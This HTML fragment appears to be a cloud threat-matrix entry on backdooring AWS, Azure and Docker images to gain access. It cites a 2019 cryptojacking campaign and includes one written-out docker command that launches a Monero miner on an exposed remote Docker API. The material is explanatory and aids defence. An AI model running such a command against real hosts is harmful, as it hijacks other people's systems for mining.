<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Amazon Web Service (AWS) Amazon Machine Images (AMI), and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored to include malicious code. Depending on how the infrastructure is provisioned, this could provide initial or persistent access.</p>

<p>For example, a publicly accessible tool has been developed to facilitate planting backdoors in AWS Docker container images. If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a web shell. Adversaries may also implant Docker images that may be inadvertently used in cloud deployments especially with cluster management services like Kubernetes. Kubernetes will grab new container images from a configured repository and run them dynamically. If a malicious image makes it into the container registry, an adversary can be reasonably sure it will eventually be run by a newly launched Kubernetes node.</p>

</td>
<td valign="top" width="423"><p>On November 24, 2019, a cryptojacking campaign exploited Docker API endpoints to mine Monero. This was done by deploying an Alpine Linux OS container to the exposed Docker API that runs a malicious script from the attackers’ servers and installs a Monero miner. Launching a mining container is as easy as<i>docker -H 192.168.1.7:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig-o POOL01 -o POOL02 -u WALLET -p PASSWORD -k</i></p>

<p>If an automated scanning tool does not flag something suspicious in an image, it will be difficult to detect malicious behavior inserted into one of the many processes running inside the container. However, it should be possible to detect any network connections a container is making unexpectantly which could indicate a backdoor is being initiated.</p>
